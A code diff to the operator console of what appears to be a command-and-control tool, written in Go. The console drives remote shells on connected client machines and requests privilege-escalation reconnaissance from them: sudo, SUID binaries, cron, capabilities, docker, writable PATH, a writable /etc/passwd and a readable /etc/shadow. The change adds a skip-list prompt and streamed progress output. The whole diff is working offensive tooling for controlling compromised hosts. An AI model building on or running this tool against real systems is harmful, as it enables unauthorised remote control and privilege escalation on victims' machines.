@@ -223,7 +223,7 @@ func handleShell(c *Client) {
 		return
 	}
 
-	// Wait for shell_ready
+	// Wait for shell_ready via JSON (last JSON message)
 	for {
 		var msg struct {
 			Status string `json:"status"`
@@ -237,21 +237,21 @@ func handleShell(c *Client) {
 		}
 	}
 
-	// Read shell output in background
+	// Now switch to raw byte I/O — no more JSON decoder
 	done := make(chan struct{})
 	go func() {
 		defer close(done)
+		reader := bufio.NewReader(c.Conn)
 		for {
-			var msg struct {
-				Status string `json:"status"`
-			}
-			if err := c.Decoder.Decode(&msg); err != nil {
+			line, err := reader.ReadString('\n')
+			if err != nil {
 				return
 			}
-			if msg.Status == "shell_done" {
+			if strings.Contains(line, "__ZHENG_SHELL_DONE__") {
 				fmt.Printf("\nshell exited on client %d\n", c.ID)
 				return
 			}
+			fmt.Print(line)
 		}
 	}()
 
@@ -260,6 +260,7 @@ func handleShell(c *Client) {
 	for scanner.Scan() {
 		line := scanner.Text()
 		if line == "exit" {
+			fmt.Fprintf(c.Conn, "exit\n")
 			fmt.Printf("leaving shell on client %d\n", c.ID)
 			return
 		}
@@ -365,49 +366,104 @@ func main() {
 				fmt.Printf("client %d not found or inactive\n", id)
 				continue
 			}
-			fmt.Printf("%s[*] running LPE checks on client %d (%s@%s)...%s\n",
+			fmt.Printf("%s[*] requesting LPE checks from client %d (%s@%s)...%s\n",
 				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
 			if err := sendCommand(c, "lpe"); err != nil {
 				fmt.Printf("failed to send command: %v\n", err)
 				continue
 			}
-			// Wait for status
+
+			// Read lpe_running
 			var statusMsg struct {
 				Status string `json:"status"`
 			}
 			c.Decoder.Decode(&statusMsg)
-			// Read LPE results
-			var lpe struct {
-				OSInfo       string `json:"os_info"`
-				Sudo         string `json:"sudo"`
-				SUID         string `json:"suid"`
-				Cron         string `json:"cron"`
-				Capabilities string `json:"capabilities"`
-				Docker       string `json:"docker"`
-				PATH         string `json:"path_writable"`
-				Passwd       string `json:"passwd_writable"`
-				Shadow       string `json:"shadow_readable"`
-				WorldWrite   string `json:"world_writable"`
-				Interesting  string `json:"interesting_files"`
+
+			// Read lpe_checks with check names
+			var checksMsg struct {
+				Status string   `json:"status"`
+				Checks []string `json:"checks"`
 			}
-			if err := c.Decoder.Decode(&lpe); err != nil {
+			if err := c.Decoder.Decode(&checksMsg); err != nil {
 				fmt.Printf("connection lost: %v\n", err)
 				continue
 			}
+
+			// Display checks and prompt for skip
+			fmt.Println()
+			fmt.Printf("%savailable checks:%s\n", colorBold, colorReset)
+			for i, name := range checksMsg.Checks {
+				fmt.Printf("  %d. %s\n", i+1, name)
+			}
+			fmt.Println()
+			fmt.Printf("%senter comma-separated names to skip (or 'none'): %s", colorYellow, colorReset)
+
+			// Read user input for skip list
+			scanSkip := bufio.NewScanner(os.Stdin)
+			var skipList []string
+			if scanSkip.Scan() {
+				input := strings.TrimSpace(scanSkip.Text())
+				if input != "none" && input != "" {
+					for _, s := range strings.Split(input, ",") {
+						skipList = append(skipList, strings.TrimSpace(s))
+					}
+				}
+			}
+
+			// Send skip list
+			c.Encoder.Encode(map[string]interface{}{"cmd": "lpe_skip", "skip": skipList})
+
+			fmt.Println()
+			fmt.Printf("%s[*] running LPE checks (skipping: %v)...%s\n", colorCyan, skipList, colorReset)
+			fmt.Println()
+
+			// Read progress messages and final results
+			lpeResults := make(map[string]string)
+			for {
+				var msg map[string]interface{}
+				if err := c.Decoder.Decode(&msg); err != nil {
+					fmt.Printf("connection lost: %v\n", err)
+					break
+				}
+
+				status, _ := msg["status"].(string)
+
+				switch status {
+				case "lpe_check":
+					name, _ := msg["name"].(string)
+					cmd, _ := msg["cmd"].(string)
+					fmt.Printf("%s> [%s]%s %s\n", colorGreen, name, colorReset, cmd)
+
+				case "lpe_skip":
+					name, _ := msg["name"].(string)
+					fmt.Printf("%s> [%s] SKIP%s\n", colorRed, name, colorReset)
+
+				default:
+					// No status = final results
+					for k, v := range msg {
+						if str, ok := v.(string); ok {
+							lpeResults[k] = str
+						}
+					}
+					goto lpeDone
+				}
+			}
+		lpeDone:
+
 			fmt.Println()
 			fmt.Printf("%s=== LPE RESULTS for %s@%s ===%s\n", colorBold, c.Recon.Username, c.Recon.Hostname, colorReset)
 			fmt.Println()
-			printLPECheck("OS Info", lpe.OSInfo)
-			printLPECheck("Sudo", lpe.Sudo)
-			printLPECheck("SUID Binaries", lpe.SUID)
-			printLPECheck("Cron", lpe.Cron)
-			printLPECheck("Capabilities", lpe.Capabilities)
-			printLPECheck("Docker", lpe.Docker)
-			printLPECheck("Writable PATH dirs", lpe.PATH)
-			printLPECheck("/etc/passwd writable", lpe.Passwd)
-			printLPECheck("/etc/shadow readable", lpe.Shadow)
-			printLPECheck("World-writable files", lpe.WorldWrite)
-			printLPECheck("Interesting files", lpe.Interesting)
+			printLPECheck("OS Info", lpeResults["os_info"])
+			printLPECheck("Sudo", lpeResults["sudo"])
+			printLPECheck("SUID Binaries", lpeResults["suid"])
+			printLPECheck("Cron", lpeResults["cron"])
+			printLPECheck("Capabilities", lpeResults["capabilities"])
+			printLPECheck("Docker", lpeResults["docker"])
+			printLPECheck("Writable PATH dirs", lpeResults["path_writable"])
+			printLPECheck("/etc/passwd writable", lpeResults["passwd_writable"])
+			printLPECheck("/etc/shadow readable", lpeResults["shadow_readable"])
+			printLPECheck("World-writable files", lpeResults["world_writable"])
+			printLPECheck("Interesting files", lpeResults["interesting_files"])
 			fmt.Println()
 
 		case "/clear":
